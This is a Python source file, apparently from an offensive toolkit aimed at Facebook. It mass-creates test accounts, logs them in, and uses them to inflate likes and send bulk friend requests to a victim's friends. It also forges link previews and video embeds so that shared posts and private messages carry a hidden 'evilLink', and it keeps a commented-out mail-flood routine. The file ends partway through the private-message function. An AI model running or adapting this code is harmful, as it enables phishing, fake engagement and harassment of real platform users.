from getpass import getpass
from mainLib import *
import MyParser 
from urllib import urlencode
import simplejson as json
import database
from time import time,ctime,sleep
import pickle
import re
from handlers import *
import signal
import networkx as nx
import matplotlib.pyplot as plt
import numpy as np
import community
from networkx.drawing.nx_agraph import write_dot
from base64 import b64encode
import logging

def setGlobalLogginng():
    global globalLogging
    globalLogging = not globalLogging
    message = 'logging level set to %s' %globalLogging
    logs(message)
    raw_input(message + ' Press enter to continue')  

def setMail():
    email = raw_input("Enter the email: ")
    password = getpass("Enter the Password: ")
    return email, password


def login(email, password,state):
    
    cookieHandler = customCookies()
    # Empty the cookies
    cj.clear()
    # Access the login page to get the forms
    try:
        br.open('https://login.facebook.com/login.php')
    except mechanize.HTTPError as e:
        logs(str(e.code) + ' on login module')
        print str(e.code) + ' on login module'
        return -1
    except mechanize.URLError as e:
        logs(str(e.reason.args) + ' on login module')
        print str(e.reason.args) + ' on login module'
        return -1
    except:
        logs('Can\'t Access the login.php form')
        print '\rCan\'t Access the login.php form\r'
        return -1
        
    # Select the first form
    br.select_form(nr=0)
        
    # Set email and pass to the form
    try:
        br.form['email'] = email
        br.form['pass'] = password
    except:
        logs('Something bad happen.. Couldn\'t set email and password')
        print '\rSomething bad happen.. Couldn\'t set email and password\r'
        return -1
    
    # Send the form
    try:
        response = br.submit()
        if globalLogging:
            logs(response.read())
    except:
        logs('Fatal error while submitting the login form')
        print '\rFatal error while submitting the login form\r'
        return -1
    try:
        if cookieHandler.isLogged(cj) == True:
            #Checkpoint exists (?) 
            if cookieHandler.checkPoint(cj) == True:
                    print 'Error - Checkpoint reached, your account may be blocked'
                    return -1
            # Assign cookies to array
            if state != 'real':
                cookieArray.append(cj._cookies)
        else:
            logs('Logging failed')
            print '\rLogging failed, check credentials and try again\r'
            return -1

    except signalCaught as e:
        deleteUser(10)
        message = '%s catch from login' %e.args[0]
        logs(str(message))
        print '%s \n' %message
        raw_input('Press enter to continue')
        return
        

    


def set_dtsg():
    n = 0
    flag = False
    try:
        response = br.open('https://www.facebook.com/')
        for form in br.forms():
            for control in form.controls: 
                if control.name == 'fb_dtsg':
                    flag = True
                    break
            n += 1
            if flag: break
        br.select_form(nr=n-1)
        
        if globalLogging:
            logs(response.read())
            
    except mechanize.HTTPError as e:
        logs(e.code)
        print e.code
    except mechanize.URLError as e:
        logs(e.reason.args)
        print e.reason.args    
    except:
        logs('Error in the dtsg set module')
        print '\rError in the dtsg set module\r'
        raise 

            
def getC_user():
    # Get the c_user value from the cookie
    #Filtramos la cookie para obtener el nombre de usuario
    for cookie in cj:
        if (cookie.name == 'c_user'):
            c_user = cookie.value
            return c_user
        
def createUser(number):
    
    set_dtsg()
    c_user = getC_user()
    
    arguments = {
        '__user' : c_user,
        '__a' : '1',
        '__dyn' : '798aD5z5zufEa0',
        '__req' : '4',
        'fb_dtsg' : br.form['fb_dtsg'],
        'phstamp' : '16581655751108754574',
    }
    
    datos = urlencode(arguments)
    
    userRaw = []
    
    percentage = 0.0
    print 'Creating Test Users .. '
    for i in range(int(number)):
        try:
            response = br.open('https://www.facebook.com/ajax/whitehat/create_test_user.php',datos)
            userRaw.append(str(response.read()))
            
            percentage = (i * 100.0) / int(number)
            print '\rCompleted [%.2f%%]\r'%percentage,
            sleep(60)
        except mechanize.HTTPError as e:
            logs(str(e.code) + ' on iteration ' + str(i))
            print str(e.code) + ' on iteration %d'%i
        except mechanize.URLError as e:
            logs(str(e.reason.args) + ' on iteration ' + str(i))
            print str(e.reason.args) + ' on iteration %d'%i   
        except signalCaught as e:
            raise signalCaught(str(e.args[0])+' handling from createUser.. ')
        except:
            logs('Error in create module on iteration ' + str(i))
            print '\r                                                        \r',
            print '\rError in create module on iteration %d\r' %i,
            
        
    fullFlag = MyParser.parseData(userRaw)
    
    return fullFlag
    
def deleteUser():
    #Number is the max amount of test user accounts - Modify this value if the platform change
    number = 10 
    itemNum = 0
    users = []
    ids = []
    
    try:
        request = br.open("https://www.facebook.com/whitehat/accounts/")
        
    except mechanize.HTTPError as e:
        logs(str(e.code) + ' on deleteUser module')
        print str(e.code) + ' on deleteUser module'
    except mechanize.URLError as e:
        logs(str(e.reason.args) + ' on deleteUser module')
        print str(e.reason.args) + ' on deleteUser module'
    
    i = 0
    
    for form in br.forms():
        try:
            form.find_control('selected_test_users[]').items
            br.select_form(nr=i)
            break
        except:
            i += 1
            continue     
    try:
        for item in br.form.find_control('selected_test_users[]').items:
            users.append(item.name)
            br.form.find_control('selected_test_users[]').items[itemNum].selected = True
            itemNum += 1
        
        string = list(br.forms())[1]['fb_dtsg']
        i = 0
        
        dictioUser = {'fb_dtsg':str(string)}
        
        for parameters in users:
            if (i <= number):
                dictioUser['selected_test_users['+str(i)+']'] = parameters
            i += 1
        
        for elements in dictioUser:
            ids.append(str(dictioUser[str(elements)]))
        
        dictioUser['__user'] = str(getC_user())
        dictioUser['__a'] = '1'
        dictioUser['__dyn'] = '7n8ahyj35zolgDxqihXzA'
        dictioUser['__req'] = 'a'
        dictioUser['phstamp'] = '1658168991161218151159'
        
        datos = urlencode(dictioUser)
        response = br.open('https://www.facebook.com/ajax/whitehat/delete_test_users.php',datos)
        
        if globalLogging:
            logs(request.read())
            logs(response.read())
            
    except:
        logs('No users for eliminate')
        print '\rNo users for eliminate\r'
        

def massLogin():
    
    i = int(0)
    people = database.getUsersNotLogged()
    #Flush
    print '\r                                                        \r',
    
    for person in people:
        #login
        rsp = login(str(person[2]),str(person[3]),'test')
        #percentage
        i+=1
        percentage = (i * 100.0) / len(people)
        print '\rCompleted [%.2f%%]\r'%percentage,
        if rsp == -1:
            database.removeTestUsers(person[0])
                    
            
def friendshipRequest():
    if (len(cookieArray) == 1):
        massLogin()
    userID = database.getUsers()
    for cookies in range(len(cookieArray)):
        cj._cookies = cookieArray[cookies]
        c_user = getC_user()
        users = 0
        for person in userID:
            '''---------------------Comienza el envio de solicitudes ... ----------------------- '''
            if users > cookies:
                sendRequest(person[0],c_user)
            users += 1

def sendRequest(userID,c_user):
    
    ''' Selects the fb_dtsg form '''   
    set_dtsg()
    arguments = {
        'to_friend' : userID,
        'action' : 'add_friend',
        'how_found' : 'profile_button',
        'ref_param' : 'none',
        'link_data[gt][profile_owner]' : userID,
        'link_data[gt][ref]' : 'timeline:timeline',
        'outgoing_id' : '',
        'logging_location' : '',
        'no_flyout_on_click' : 'true',
        'ego_log_data' : '',
        'http_referer' : '',
        '__user' : c_user,
        '__a' : '1',
        '__dyn' : '7n8aD5z5zu',
        '__req' : 'n',
        'fb_dtsg' : br.form['fb_dtsg'],
        'phstamp' : '1658165688376111103320'
        }
        

    datos = urlencode(arguments)
    try:
        response = br.open('https://www.facebook.com/ajax/add_friend/action.php',datos)
        
        if globalLogging:
            logs(response.read())
            
        print 'Friend Request sent from %s to %s! \n' %(c_user,userID)
    except:
        logs('Error sending request ')
        print 'Error sending request \n'

def sendRequestToList(victim):
    
    root = 'dumps'
    directory = victim
    friends = []
    frieds_send = []
    count = 0
    number = raw_input('Insert the amount of requests to send: ')
    
    try:
        try:
            persons = open(root+'\\'+directory+'\\'+victim+'.txt',"rb")
        except:
            logs('Friend file not found')
            print 'Friend file not found'
            return
        try:
            persons_send = open(root+'\\'+directory+'\\'+victim+'_friend_send.txt',"rb")
            while True:
                linea = persons_send.readline()
                if not linea:
                    break
                frieds_send.append(linea.strip("\n\r"))
            persons_send.close()
            persons_send = open(root+'\\'+directory+'\\'+victim+'_friend_send.txt',"ab")
        except:
            persons_send = open(root+'\\'+directory+'\\'+victim+'_friend_send.txt',"wb")
            
        while True:
            linea = persons.readline()
            if not linea:
                break
            friends.append(linea.strip("\n\r"))
        
        i = 0.0
        percentage = 0.0
        
        print 'Sending friend requests'
        
                
        for userID in friends:        
            if userID not in frieds_send:
                #Escape condition
                if count > int(number):
                    persons_send.close()
                    return
                
                count += 1
                ''' Selects the fb_dtsg form '''   
                set_dtsg()
                c_user = getC_user()
                    
                arguments = {
                    'to_friend' : userID,
                    'action' : 'add_friend',
                    'how_found' : 'profile_button',
                    'ref_param' : 'none',
                    'link_data[gt][profile_owner]' : userID,
                    'link_data[gt][ref]' : 'timeline:timeline',
                    'outgoing_id' : '',
                    'logging_location' : '',
                    'no_flyout_on_click' : 'true',
                    'ego_log_data' : '',
                    'http_referer' : '',
                    '__user' : c_user,
                    '__a' : '1',
                    '__dyn' : '7n8aD5z5zu',
                    '__req' : 'n',
                    'fb_dtsg' : br.form['fb_dtsg'],
                    'ttstamp' : '265817211599516953787450107',
                    }
                
        
                datos = urlencode(arguments)
                try:
                    response = br.open('https://www.facebook.com/ajax/add_friend/action.php',datos)
                    
                    #percentage
                    percentage = (i * 100.0) / len(friends)
                    i+=1
                    print '\rCompleted [%.2f%%]\r'%percentage,
                            
                    if globalLogging:
                        logs(response.read())
                        
                    print 'Friend Request sent from %s to %s! \n' %(c_user,userID)
                    persons_send.write(userID+'\n')
                except:
                    logs('Error sending request ')
                    print 'Error sending request \n'
    except signalCaught as e:
        message = '%s catch from send request module' %e.args[0]
        logs(str(message))
        print '%s \n' %message
        persons_send.close()
        raw_input('Press enter to continue')
        return

def acceptRequest():
    initAccept()
    acceptIDS = MyParser.parsePending()
    while len(acceptIDS) != 0:
        for elements in acceptIDS:
            set_dtsg()               
            arguments = {
                'action' : 'confirm',
                'id' : elements,
                'ref' : '%2Freqs.php',
                '__user' : getC_user(),
                '__a' : '1',
                '__dyn' : '7n8aD5z5zu',
                '__req' : 'm',
                'fb_dtsg' : br.form['fb_dtsg'],
                'phstamp' : '165816867997811675120'
                }
    
            datos = urlencode(arguments)
            response = br.open('https://www.facebook.com/requests/friends/ajax/ ',datos)
            
            if globalLogging:
                logs(response.read())
                
            print 'Accept done! \n'
            
        initAccept()
        acceptIDS = MyParser.parsePending()

def initAccept():
    f = open("respuesta.html","wb")
    response = br.open('https://www.facebook.com/friends/requests/')
        
    ''' Se guarda el output de la respuesta html para ser parseada y filtrar los ID's '''
    f.write(response.read())
    f.close()

def savePersistentCookie():
    f = open("cookiesObject","wb")
    pickle.dump(cookieArray,f)
    f.close()
    for element in cookieArray:
        cj._cookies = element
        for cookie in cj:
            if (cookie.name == 'c_user'):
                c_user = cookie.value
                database.setLogged(c_user)
    
def loadPersistentCookie():
    global cookieArray
    f = open("cookiesObject","r")
    cookieArray = pickle.load(f)
    i = 0
    ''' Se limpian las cookies que no sirven - se filtra el id para cambiar su estado a logged = 0 '''
    for cookie in cookieArray:
        cj._cookies = cookie
        for element in cj:
            if (element.name == 'checkpoint'):
                strip = str(element.value).strip("%7B%22u%22%3A")
                removeId = strip.split("%2C%22t%22%3A")[0]
                database.setLoggedOut(removeId)
                del cookieArray[i]
        i+=1
            
def deleteAccounts():
    people = database.getUsers()
    for person in people:
        database.removeTestUsers(person[0]) 
    cookieArray[:] = [] 
    
def like(postId, quantity):
        
    signal.signal(signal.SIGINT, signal_handler)
    try:
        email,password = setMail()
        if (login(email,password,'real') is not -1):
            
            #Cookie of the real account
            masterCookie = cj._cookies
            times = int(quantity) / 10
            
            for i in range(times):
                cj._cookies = masterCookie
                #Check if users already exists
                if ( createUser(10) == -1 ):
                    #Delete existing users and re-execute the create module
                    deleteUser()
                    deleteAccounts()
                    createUser(10)
                    
                massLogin()
                #Percentage container
                percentage = 0.0
                j = 0.0
                total = len(cookieArray) * len(postId)
                #flush
                print '\r                                                        \r',
                
                for i in range(len(cookieArray)):
                    for post in range(len(postId)):
                        cj._cookies = cookieArray[i]
                        c_user = getC_user()
                        try:
                            set_dtsg()
                            arguments = {
                                'like_action' : 'true',
                                'ft_ent_identifier' : str(postId[post]),
                                'source' : '0',
                                'client_id' : str(c_user)+'%3A4047576437',
                                'rootid' : 'u_0_2o',
                                'giftoccasion' : '',
                                'ft[tn]' : '%3E%3D',
                                'ft[type]' : '20',
                                'nctr[_mod]' : 'pagelet_timeline_recent',
                                '__user' : c_user,
                                '__a' : '1',
                                '__dyn' : '7n8ahyj35ym3KiA',
                                '__req' : 'c',
                                'fb_dtsg' : br.form['fb_dtsg'],
                                'phstamp' : '165816595797611370260',
                            }
                    
                            datos = urlencode(arguments)
                            response = br.open('https://www.facebook.com/ajax/ufi/like.php',datos)
                            
                            if globalLogging:
                                logs(response.read())
                            
                            percentage = (j * 100.0)/total
                            print '\r[%.2f%%] of likes completed\r' %(percentage), 
                            j+=1
                                
                        except mechanize.HTTPError as e:
                            print e.code
                            
                        except mechanize.URLError as e:
                                print e.reason.args  
                        except:
                            print 'Unknown error' 
                    
                cj._cookies = masterCookie
                deleteUser()
                deleteAccounts()
                
            raw_input('Finished like() module, press enter to continue')
    except signalCaught as e:
        deleteUser()
        message = '%s catch from create module' %e.args[0]
        logs(str(message))
        print '%s \n' %message
        raw_input('Press enter to continue')
        return
    
            
def appMessageSpoof(appId,link,picture,title,domain,description,comment):
    c_user = getC_user()
    print str(c_user)+'\n'
    try:
        set_dtsg()
        arguments = {
            'fb_dtsg' : br.form['fb_dtsg'],
            'preview' : '0',
            '_path' : 'feed',
            'app_id' : int(appId),
            'redirect_uri' : 'https://facebook.com',
            'display' : 'page',
            'link' : str(link),
            'picture' : str(picture),
            'name' : str(title),
            'caption' : str(domain),
            'description' : str(description),
            'from_post' : '1',
            'feedform_user_message' : str(comment),
            'publish' : 'Share',
            'audience[0][value]' : '80',
            }
        
        datos = urlencode(arguments)
        response = br.open('https://www.facebook.com/dialog/feed',datos)
        
        if globalLogging:
                logs(response.read())
                
    except:
        logs('Error en el modulo de appMessageSpoof()')
        print 'Error en el modulo de appMessageSpoof()\n'
   

def linkPreviewYoutube(link,videoLink,title,summary,comment,videoID, privacy):
    c_user = getC_user()
    print str(c_user)+'\n'
    try:
        set_dtsg()
        arguments = {
            'fb_dtsg' : br.form['fb_dtsg'],
            'composer_session_id' : '38c20e73-acfc-411a-8313-47c095b01e42',
            'xhpc_context' : 'profile',
            'xhpc_ismeta' : '1',
            'xhpc_timeline' : '1',
            'xhpc_composerid' : 'u_0_29',
            'xhpc_targetid' : str(c_user),
            'clp' : '{ cl_impid : 65ac6257 , clearcounter :0, elementid : u_0_2n , version : x , parent_fbid :'+str(c_user)+'}',
            'xhpc_message_text' : str(comment),
            'xhpc_message' : str(comment),
            'aktion' : 'post',
            'app_id' : '2309869772',
            'attachment[params][urlInfo][canonical]' : str(videoLink),
            'attachment[params][urlInfo][final]' : str(videoLink),
            'attachment[params][urlInfo][user]' : str(link),
            'attachment[params][favicon]' : 'http://s.ytimg.com/yts/img/favicon_32-vflWoMFGx.png',
            'attachment[params][title]' : str(title),
            'attachment[params][summary]' : str(summary),
            'attachment[params][images][0]' : 'http://i2.ytimg.com/vi/'+videoID+'/mqdefault.jpg?feature=og',
            'attachment[params][medium]' : '103',
            'attachment[params][url]' : str(videoLink),
            'attachment[params][video][0][type]' : 'application/x-shockwave-flash',
            'attachment[params][video][0][src]' : 'http://www.youtube.com/v/FxyecjOQXnI?autohide=1&version=3&autoplay=1',
            'attachment[params][video][0][width]' : '1280',
            'attachment[params][video][0][height]' : '720',
            'attachment[params][video][0][safe]' : '1',
            'attachment[type]' : '100',
            'link_metrics[source]' : 'ShareStageExternal',
            'link_metrics[domain]' : 'www.youtube.com',
            'link_metrics[base_domain]' : 'youtube.com',
            'link_metrics[title_len]' : '92',
            'link_metrics[summary_len]' : '160',
            'link_metrics[min_dimensions][0]' : '70',
            'link_metrics[min_dimensions][1]' : '70',
            'link_metrics[images_with_dimensions]' : '1',
            'link_metrics[images_pending]' : '0',
            'link_metrics[images_fetched]' : '0',
            'link_metrics[image_dimensions][0]' : '1280',
            'link_metrics[image_dimensions][1]' : '720',
            'link_metrics[images_selected]' : '1',
            'link_metrics[images_considered]' : '1',
            'link_metrics[images_cap]' : '10',
            'link_metrics[images_type]' : 'images_array',
            'composer_metrics[best_image_w]' : '398',
            'composer_metrics[best_image_h]' : '208',
            'composer_metrics[image_selected]' : '0',
            'composer_metrics[images_provided]' : '1',
            'composer_metrics[images_loaded]' : '1',
            'composer_metrics[images_shown]' : '1',
            'composer_metrics[load_duration]' : '1058',
            'composer_metrics[timed_out]' : '0',
            'composer_metrics[sort_order]' : '',
            'composer_metrics[selector_type]' : 'UIThumbPager_6',
            'backdated_date[year]' : '',
            'backdated_date[month]' : '',
            'backdated_date[day]' : '',
            'backdated_date[hour]' : '',
            'backdated_date[minute]' : '',
            'is_explicit_place' : '',
            'composertags_place' : '',
            'composertags_place_name' : '',
            'tagger_session_id' : '1394761251',
            'action_type_id[0]' : '',
            'object_str[0]' : '',
            'object_id[0]' : '',
            'og_location_id[0]' : '',
            'hide_object_attachment' : '0',
            'og_suggestion_mechanism' : '',
            'composertags_city' : '',
            'disable_location_sharing' : 'false',
            'composer_predicted_city' : '',
            'audience[0][value]' : privacy,
            'nctr[_mod]' : 'pagelet_timeline_recent',
            '__user' : str(c_user),
            '__a' : '1',
            '__dyn' : '7n8aqEAMBlCFUSt2u6aOGeExEW9ACxO4pbGA8AGGzCAjFDxCm',
            '__req' : 'm',
            'ttstamp' : '26581658074898653',
            '__rev' : '1161243',
            }
        
        datos = urlencode(arguments)
        response = br.open('https://www.facebook.com/ajax/updatestatus.php',datos)
        
        if globalLogging:
                logs(response.read())
    
    except mechanize.HTTPError as e:
        print e.code
    
    except mechanize.URLError as e:
            print e.reason.args              
    except:
        logs('Error en el modulo de linkPreviewYoutube()')
        print 'Error en el modulo de linkPreviewYoutube()\n'
        
def linkPreview(link,realLink,title,summary,comment,image,privacy):
    c_user = getC_user()
    print str(c_user)+'\n'
    try:
        set_dtsg()
        arguments = {
            'composer_session_id' : '787d2fec-b5c1-41fe-bbda-3450a03240c6',
            'fb_dtsg' : br.form['fb_dtsg'],
            'xhpc_context' : 'profile',
            'xhpc_ismeta' : '1',
            'xhpc_timeline' : '1',
            'xhpc_composerid' : 'u_0_29',
            'xhpc_targetid' : str(c_user),
            'clp' : '{"cl_impid":"27c5e963","clearcounter":0,"elementid":"u_0_2n","version":"x","parent_fbid":'+str(c_user)+'}',
            'xhpc_message_text' : str(comment),
            'xhpc_message' : str(comment),
            'aktion' : 'post',
            'app_id' : '2309869772',
            'attachment[params][urlInfo][canonical]' : str(realLink),
            'attachment[params][urlInfo][final]' : str(realLink),
            'attachment[params][urlInfo][user]' : str(link),
            'attachment[params][favicon]' : str(realLink)+'/images/favicon.ico',
            'attachment[params][title]' : str(title),
            'attachment[params][summary]' : str(summary),
            'attachment[params][images][0]' : str(image),
            'attachment[params][medium]' : '106',
            'attachment[params][url]' : str(realLink),
            'attachment[type]' : '100',
            'link_metrics[source]' : 'ShareStageExternal',
            'link_metrics[domain]' : str(realLink),
            'link_metrics[base_domain]' : str(realLink),
            'link_metrics[title_len]' : '38',
            'link_metrics[summary_len]' : '38',
            'link_metrics[min_dimensions][0]' : '70',
            'link_metrics[min_dimensions][1]' : '70',
            'link_metrics[images_with_dimensions]' : '3',
            'link_metrics[images_pending]' : '0',
            'link_metrics[images_fetched]' : '0',
            'link_metrics[image_dimensions][0]' : '322',
            'link_metrics[image_dimensions][1]' : '70',
            'link_metrics[images_selected]' : '1',
            'link_metrics[images_considered]' : '5',
            'link_metrics[images_cap]' : '3',
            'link_metrics[images_type]' : 'ranked',
            'composer_metrics[best_image_w]' : '100',
            'composer_metrics[best_image_h]' : '100',
            'composer_metrics[image_selected]' : '0',
            'composer_metrics[images_provided]' : '1',
            'composer_metrics[images_loaded]' : '1',
            'composer_metrics[images_shown]' : '1',
            'composer_metrics[load_duration]' : '812',
            'composer_metrics[timed_out]' : '0',
            'composer_metrics[sort_order]' : '',
            'composer_metrics[selector_type]' : 'UIThumbPager_6',
            'backdated_date[year]' : '',
            'backdated_date[month]' : '',
            'backdated_date[day]' : '',
            'backdated_date[hour]' : '',
            'backdated_date[minute]' : '',
            'is_explicit_place' : '',
            'composertags_place' : '',
            'composertags_place_name' : '',
            'tagger_session_id' : '1394765332',
            'action_type_id[0]' : '',
            'object_str[0]' : '',
            'object_id[0]' : '',
            'og_location_id[0]' : '',
            'hide_object_attachment' : '0',
            'og_suggestion_mechanism' : '',
            'composertags_city' : '',
            'disable_location_sharing' : 'false',
            'composer_predicted_city' : '',
            'audience[0][value]' : privacy,
            'nctr[_mod]' : 'pagelet_timeline_recent',
            '__user' : str(c_user),
            '__a' : '1',
            '__dyn' : '7n8aqEAMBlCFUSt2u6aOGeExEW9ACxO4pbGA8AGGzCAjFDxCm',
            '__req' : 'h',
            'ttstamp' : '26581658074898653',
            '__rev' : '1161243'
            }
        
        datos = urlencode(arguments)
        response = br.open('https://www.facebook.com/ajax/updatestatus.php',datos)
        
        if globalLogging:
                logs(response.read())
    
    except mechanize.HTTPError as e:
        print e.code
    except mechanize.URLError as e:
            print e.reason.args  
                
    except:
        logs('Error en el modulo de linkPreview()')
        print 'Error en el modulo de linkPreview()\n'
        
def hijackVideo(videoLink,title,summary,comment,videoID,hijackedVideo,privacy):
    c_user = getC_user()
    print str(c_user)+'\n'
    try:
        set_dtsg()
        arguments = {
            'composer_session_id' : '8c4e1fa6-5f1f-4c16-b393-5c1ab4c3802b',
            'fb_dtsg' : br.form['fb_dtsg'],
            'xhpc_context' : 'profile',
            'xhpc_ismeta' : '1',
            'xhpc_timeline' : '1',
            'xhpc_composerid' : 'u_0_23',
            'xhpc_targetid' : str(c_user),
            'clp' : '{"cl_impid":"4b4a8369","clearcounter":0,"elementid":"u_0_2h","version":"x","parent_fbid":'+str(c_user)+'}',
            'xhpc_message_text' : str(comment),
            'xhpc_message' : str(comment),
            'aktion' : 'post',
            'app_id' : '2309869772',
            'attachment[params][urlInfo][canonical]' : str(videoLink),
            'attachment[params][urlInfo][final]' : str(videoLink),
            'attachment[params][urlInfo][user]' : str(videoLink),
            'attachment[params][favicon]' : 'http://s.ytimg.com/yts/img/favicon_32-vflWoMFGx.png',
            'attachment[params][title]' : str(title),
            'attachment[params][summary]' : str(summary),
            'attachment[params][images][0]' : 'http://i2.ytimg.com/vi/'+videoID+'/mqdefault.jpg?feature=og',
            'attachment[params][medium]' : '103',
            'attachment[params][url]' : str(videoLink),
            'attachment[params][video][0][type]' : 'application/x-shockwave-flash',
            'attachment[params][video][0][src]' : 'http://www.youtube.com/v/'+str(hijackedVideo)+'?version=3&autohide=1&autoplay=1',
            'attachment[params][video][0][width]' : '1920',
            'attachment[params][video][0][height]' : '1080',
            'attachment[params][video][0][safe]' : '1',
            'attachment[type]' : '100',
            'link_metrics[source]' : 'ShareStageExternal',
            'link_metrics[domain]' : 'www.youtube.com',
            'link_metrics[base_domain]' : 'youtube.com',
            'link_metrics[title_len]' : str(len(title)),
            'link_metrics[summary_len]' : str(len(summary)),
            'link_metrics[min_dimensions][0]' : '62',
            'link_metrics[min_dimensions][1]' : '62',
            'link_metrics[images_with_dimensions]' : '1',
            'link_metrics[images_pending]' : '0',
            'link_metrics[images_fetched]' : '0',
            'link_metrics[image_dimensions][0]' : '1920',
            'link_metrics[image_dimensions][1]' : '1080',
            'link_metrics[images_selected]' : '1',
            'link_metrics[images_considered]' : '1',
            'link_metrics[images_cap]' : '10',
            'link_metrics[images_type]' : 'images_array',
            'composer_metrics[best_image_w]' : '154',
            'composer_metrics[best_image_h]' : '154',
            'composer_metrics[image_selected]' : '0',
            'composer_metrics[images_provided]' : '1',
            'composer_metrics[images_loaded]' : '1',
            'composer_metrics[images_shown]' : '1',
            'composer_metrics[load_duration]' : '1184',
            'composer_metrics[timed_out]' : '0',
            'composer_metrics[sort_order]' : '',
            'composer_metrics[selector_type]' : 'UIThumbPager_6',
            'backdated_date[year]' : '',
            'backdated_date[month]' : '',
            'backdated_date[day]' : '',
            'backdated_date[hour]' : '',
            'backdated_date[minute]' : '',
            'is_explicit_place' : '',
            'composertags_place' : '',
            'composertags_place_name' : '',
            'tagger_session_id' : '1399663185',
            'action_type_id[0]' : '',
            'object_str[0]' : '',
            'object_id[0]' : '',
            'og_location_id[0]' : '',
            'hide_object_attachment' : '0',
            'og_suggestion_mechanism' : '',
            'composertags_city' : '',
            'disable_location_sharing' : 'false',
            'composer_predicted_city' : '',
            'audience[0][value]' : str(privacy),
            'nctr[_mod]' : 'pagelet_timeline_recent',
            '__user' : str(c_user),
            '__a' : '1',
            '__dyn' : '7n8ajEAMBlynzpQ9UoGya4Cq7pEsx6iWF29aGEZ94WpUpBxCFaG',
            '__req' : 'g',
            'ttstamp' : '265817289113541097355755354',
            '__rev' : '1241763',
            }
        
        datos = urlencode(arguments)
        response = br.open('https://www.facebook.com/ajax/updatestatus.php',datos)
        
        if globalLogging:
                logs(response.read())
        
    except:
        logs('Error en el modulo de linkPreviewYoutube()')
        print 'Error en el modulo de linkPreviewYoutube()\n'
        
#########################################
#Vulnerability no longer available 
#########################################
#def mailFlood(victim,message):
#    for cookies in cookieArray:
#        print cookies
#        cj._cookies = cookies
#        c_user = getC_user()
#        print str(c_user)+'\n'
#        try:
#            set_dtsg()
#            arguments = {
#                'message_batch[0][action_type]' : 'ma-type:user-generated-message',
#                'message_batch[0][thread_id]' : '',
#                'message_batch[0][author]' : 'fbid:'+str(c_user),
#                'message_batch[0][author_email]' : '',
#                'message_batch[0][coordinates]' : '',
#                'message_batch[0][timestamp]' : '1372638156169',
#                'message_batch[0][timestamp_absolute]' : 'Hoy',
#                'message_batch[0][timestamp_relative]' : '21:22',
#                'message_batch[0][timestamp_time_passed]' : '0',
#                'message_batch[0][is_unread]' : 'false',
#                'message_batch[0][is_cleared]' : 'false',
#                'message_batch[0][is_forward]' : 'false',
#                'message_batch[0][is_filtered_content]' : 'false',
#                'message_batch[0][spoof_warning]' : 'false',
#                'message_batch[0][source]' : 'source:titan:web',
#                'message_batch[0][body]' : str(message),
#                'message_batch[0][has_attachment]' : 'false',
#                'message_batch[0][html_body]' : 'false',
#                'message_batch[0][specific_to_list][0]' : 'email:'+str(victim),
#                'message_batch[0][specific_to_list][1]' : 'fbid:'+str(c_user),
#                'message_batch[0][forward_count]' : '0',
#                'message_batch[0][force_sms]' : 'true',
#                'message_batch[0][ui_push_phase]' : 'V3',
#                'message_batch[0][status]' : '0',
#                'message_batch[0][message_id]' : '<1372638156169:4202807677-4247395496@mail.projektitan.com>',
#                'message_batch[0][client_thread_id]' : 'pending:pending',
#                'client' : 'web_messenger',
#                '__user' : str(c_user),
#                '__a' : '1',
#                '__dyn' : '7n8ahyj35zsyzk9UmAEKWw',
#                '__req' : 'b',
#                'fb_dtsg' : br.form['fb_dtsg'],
#                'phstamp' : '16581661207177118751248'
#                }
#            
#            datos = urlencode(arguments)
#            response = br.open('https://www.facebook.com/ajax/mercury/send_messages.php ',datos)
#        
#            if globalLogging:
#                logs(response.read())
#        
#        except mechanize.HTTPError as e:
#            print e.code
#        except mechanize.URLError as e:
#                print e.reason.args         
#        except:
#            print 'Ctrl+c SIGNAL Caught\n'
#            return


def privateMessageLink(message,victim,subject,realLink,title,summary,imageLink,evilLink):
    
    c_user = getC_user()
    
    try:
        set_dtsg()
        arguments = {
            'message_batch[0][action_type]' : 'ma-type:user-generated-message',
            'message_batch[0][thread_id]' : '',
            'message_batch[0][author]' : 'fbid:'+c_user,
            'message_batch[0][author_email]' : '',
            'message_batch[0][coordinates]' : '',
            'message_batch[0][timestamp]' : '1394766424499',
            'message_batch[0][timestamp_absolute]' : 'Today',
            'message_batch[0][timestamp_relative]' : '12:07am',
            'message_batch[0][timestamp_time_passed]' : '0',
            'message_batch[0][is_unread]' : 'false',
            'message_batch[0][is_cleared]' : 'false',
            'message_batch[0][is_forward]' : 'false',
            'message_batch[0][is_filtered_content]' : 'false',
            'message_batch[0][is_spoof_warning]' : 'false',
            'message_batch[0][source]' : 'source:titan:web',
            'message_batch[0][body]' : message,
            'message_batch[0][has_attachment]' : 'true',
            'message_batch[0][html_body]' : 'false',
            'message_batch[0][specific_to_list][0]' : 'fbid:' + victim,
            'message_batch[0][content_attachment][subject]' : subject,
            'message_batch[0][content_attachment][app_id]' : '2309869772',
            'message_batch[0][content_attachment][attachment][params][urlInfo][canonical]' : realLink,
            'message_batch[0][content_attachment][attachment][params][urlInfo][final]' : realLink,
            'message_batch[0][content_attachment][attachment][params][urlInfo][user]' : evilLink,
            'message_batch[0][content_attachment][attachment][params][favicon]' : realLink+'/favicon.ico',
            'message_batch[0][content_attachment][attachment][params][title]' : title,
            'message_batch[0][content_attachment][attachment][params][summary]' : summary,
            'message_batch[0][content_attachment][attachment][params][images][0]' : imageLink,
            'message_batch[0][content_attachment][attachment][params][medium]' : '106',
            'message_batch[0][content_attachment][attachment][params][url]' : realLink,
            'message_batch[0][content_attachment][attachment][type]' : '100',
            'message_batch[0][content_attachment][link_metrics][source]' : 'ShareStageExternal',
            'message_batch[0][content_attachment][link_metrics][domain]' : realLink.strip('https://').strip('/'),
            'message_batch[0][content_attachment][link_metrics][base_domain]' : realLink.strip('https://www.').strip('/'),
            'message_batch[0][content_attachment][link_metrics][title_len]' : '38',
            'message_batch[0][content_attachment][link_metrics][summary_len]' : '38',
            'message_batch[0][content_attachment][link_metrics][min_dimensions][0]' : '70',
            'message_batch[0][content_attachment][link_metrics][min_dimensions][1]' : '70',
            'message_batch[0][content_attachment][link_metrics][images_with_dimensions]' : '3',
            'message_batch[0][content_attachment][link_metrics][images_pending]' : '0',
            'message_batch[0][content_attachment][link_metrics][images_fetched]' : '0',
            'message_batch[0][content_attachment][link_metrics][image_dimensions][0]' : '322',
            'message_batch[0][content_attachment][link_metrics][image_dimensions][1]' : '70',
            'message_batch[0][content_attachment][link_metrics][images_selected]' : '1',
            'message_batch[0][content_attachment][link_metrics][images_considered]' : '5',
            'message_batch[0][content_attachment][link_metrics][images_cap]' : '3',
            'message_batch[0][content_attachment][link_metrics][images_type]' : 'ranked',
